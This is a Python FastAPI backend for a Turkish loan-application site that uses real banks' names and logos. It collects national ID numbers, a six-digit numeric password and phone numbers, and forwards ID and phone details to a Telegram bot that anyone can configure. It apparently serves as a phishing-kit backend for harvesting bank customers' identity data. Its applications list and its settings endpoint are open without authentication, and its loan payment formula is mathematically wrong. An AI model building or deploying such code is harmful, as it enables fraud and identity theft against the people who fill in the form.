from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, validator
from typing import Optional, List
import re
import asyncio
from datetime import datetime
import json

app = FastAPI(title="Kredi Başvuru API", version="1.0.0")

# Disable CORS. Do not remove this for full-stack development.
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allows all origins
    allow_credentials=True,
    allow_methods=["*"],  # Allows all methods
    allow_headers=["*"],  # Allows all headers
)

applications_db = []
telegram_settings = {
    "bot_token": "",
    "chat_id": ""
}

TURKISH_BANKS = [
    {"id": 1, "name": "Akbank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Akbank_logo.svg/200px-Akbank_logo.svg.png", "interest_rate": "2.09", "max_amount": "125000"},
    {"id": 2, "name": "QNB Finansbank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/QNB_Finansbank_logo.svg/200px-QNB_Finansbank_logo.svg.png", "interest_rate": "2.15", "max_amount": "85000"},
    {"id": 3, "name": "DenizBank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/DenizBank_logo.svg/200px-DenizBank_logo.svg.png", "interest_rate": "2.25", "max_amount": "100000"},
    {"id": 4, "name": "TEB", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/TEB_logo.svg/200px-TEB_logo.svg.png", "interest_rate": "2.30", "max_amount": "75000"},
    {"id": 5, "name": "Garanti BBVA", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Garanti_BBVA_logo.svg/200px-Garanti_BBVA_logo.svg.png", "interest_rate": "2.18", "max_amount": "150000"},
    {"id": 6, "name": "İş Bankası", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Turkiye_Is_Bankasi_logo.svg/200px-Turkiye_Is_Bankasi_logo.svg.png", "interest_rate": "2.12", "max_amount": "120000"},
    {"id": 7, "name": "Yapı Kredi", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yapi_Kredi_logo.svg/200px-Yapi_Kredi_logo.svg.png", "interest_rate": "2.20", "max_amount": "110000"},
    {"id": 8, "name": "Ziraat Bankası", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Ziraat_Bankasi_logo.svg/200px-Ziraat_Bankasi_logo.svg.png", "interest_rate": "2.05", "max_amount": "100000"},
    {"id": 9, "name": "Halkbank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Halkbank_logo.svg/200px-Halkbank_logo.svg.png", "interest_rate": "2.08", "max_amount": "90000"},
    {"id": 10, "name": "VakıfBank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/VakifBank_logo.svg/200px-VakifBank_logo.svg.png", "interest_rate": "2.10", "max_amount": "130000"},
    {"id": 11, "name": "ING Bank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/ING_Group_logo.svg/200px-ING_Group_logo.svg.png", "interest_rate": "2.35", "max_amount": "80000"},
    {"id": 12, "name": "HSBC", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/200px-HSBC_logo_%282018%29.svg.png", "interest_rate": "2.40", "max_amount": "70000"},
    {"id": 13, "name": "Şekerbank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Sekerbank_logo.svg/200px-Sekerbank_logo.svg.png", "interest_rate": "2.45", "max_amount": "60000"},
    {"id": 14, "name": "Alternatif Bank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Alternatifbank_logo.svg/200px-Alternatifbank_logo.svg.png", "interest_rate": "2.50", "max_amount": "65000"},
    {"id": 15, "name": "Kuveyt Türk", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Kuveyt_Turk_logo.svg/200px-Kuveyt_Turk_logo.svg.png", "interest_rate": "2.28", "max_amount": "85000"},
    {"id": 16, "name": "Albaraka Türk", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Albaraka_Turk_logo.svg/200px-Albaraka_Turk_logo.svg.png", "interest_rate": "2.32", "max_amount": "75000"},
    {"id": 17, "name": "ICBC Turkey", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/ICBC_logo.svg/200px-ICBC_logo.svg.png", "interest_rate": "2.55", "max_amount": "50000"},
    {"id": 18, "name": "Enpara.com", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Enpara_logo.svg/200px-Enpara_logo.svg.png", "interest_rate": "2.22", "max_amount": "95000"},
    {"id": 19, "name": "CEPTETEB", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/CEPTETEB_logo.svg/200px-CEPTETEB_logo.svg.png", "interest_rate": "2.38", "max_amount": "70000"},
    {"id": 20, "name": "ON Dijital Bank", "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/o/on/ON_Dijital_Bank_logo.svg/200px-ON_Dijital_Bank_logo.svg.png", "interest_rate": "2.42", "max_amount": "60000"}
]

class LoanApplication(BaseModel):
    tc_kimlik: str
    sifre: str
    telefon: str
    bank_id: int
    loan_amount: float
    loan_term: int
    
    @validator('tc_kimlik')
    def validate_tc_kimlik(cls, v):
        if not re.match(r'^\d{11}$', v):
            raise ValueError('T.C. kimlik numarası 11 haneli olmalıdır')
        return v
    
    @validator('sifre')
    def validate_sifre(cls, v):
        if not re.match(r'^\d{6}$', v):
            raise ValueError('Şifre 6 haneli sayı olmalıdır')
        return v
    
    @validator('telefon')
    def validate_telefon(cls, v):
        if not re.match(r'^\+905\d{9}$', v):
            raise ValueError('Telefon numarası +905 ile başlamalı ve 13 haneli olmalıdır')
        return v

class TelegramSettings(BaseModel):
    bot_token: str
    chat_id: str

class LoanCalculation(BaseModel):
    amount: float
    term: int

@app.get("/healthz")
async def healthz():
    return {"status": "ok"}

@app.get("/api/banks")
async def get_banks():
    return {"banks": TURKISH_BANKS}

@app.post("/api/calculate")
async def calculate_loan(calculation: LoanCalculation):
    offers = []
    for bank in TURKISH_BANKS:
        monthly_payment = (calculation.amount * (float(bank["interest_rate"]) / 100)) / calculation.term
        total_payment = monthly_payment * calculation.term
        
        offers.append({
            "bank": bank,
            "monthly_payment": round(monthly_payment, 2),
            "total_payment": round(total_payment, 2),
            "interest_rate": bank["interest_rate"]
        })
    
    offers.sort(key=lambda x: float(x["interest_rate"]))
    
    return {"offers": offers}

@app.post("/api/apply")
async def submit_application(application: LoanApplication):
    bank = next((b for b in TURKISH_BANKS if b["id"] == application.bank_id), None)
    if not bank:
        raise HTTPException(status_code=404, detail="Banka bulunamadı")
    
    app_record = {
        "id": len(applications_db) + 1,
        "tc_kimlik": application.tc_kimlik,
        "telefon": application.telefon,
        "bank_name": bank["name"],
        "loan_amount": application.loan_amount,
        "loan_term": application.loan_term,
        "created_at": datetime.now().isoformat(),
        "status": "pending"
    }
    
    applications_db.append(app_record)
    
    if telegram_settings["bot_token"] and telegram_settings["chat_id"]:
        try:
            await send_to_telegram(app_record)
        except Exception as e:
            print(f"Telegram gönderimi başarısız: {e}")
    
    return {"message": "Başvuru başarıyla alındı", "application_id": app_record["id"]}

@app.get("/api/applications")
async def get_applications():
    return {"applications": applications_db}

@app.get("/api/telegram-settings")
async def get_telegram_settings():
    return telegram_settings

@app.post("/api/telegram-settings")
async def update_telegram_settings(settings: TelegramSettings):
    telegram_settings["bot_token"] = settings.bot_token
    telegram_settings["chat_id"] = settings.chat_id
    return {"message": "Telegram ayarları güncellendi"}

async def send_to_telegram(application):
    if not telegram_settings["bot_token"] or not telegram_settings["chat_id"]:
        return
    
    try:
        from telegram import Bot
        bot = Bot(token=telegram_settings["bot_token"])
        
        message = f"""
🏦 Yeni Kredi Başvurusu

👤 T.C. Kimlik: {application['tc_kimlik']}
📱 Telefon: {application['telefon']}
🏛️ Banka: {application['bank_name']}
💰 Kredi Tutarı: {application['loan_amount']:,.0f} TL
📅 Vade: {application['loan_term']} ay
🕐 Tarih: {application['created_at']}
        """
        
        await bot.send_message(
            chat_id=telegram_settings["chat_id"],
            text=message
        )
    except Exception as e:
        print(f"Telegram mesaj gönderimi hatası: {e}")
        raise
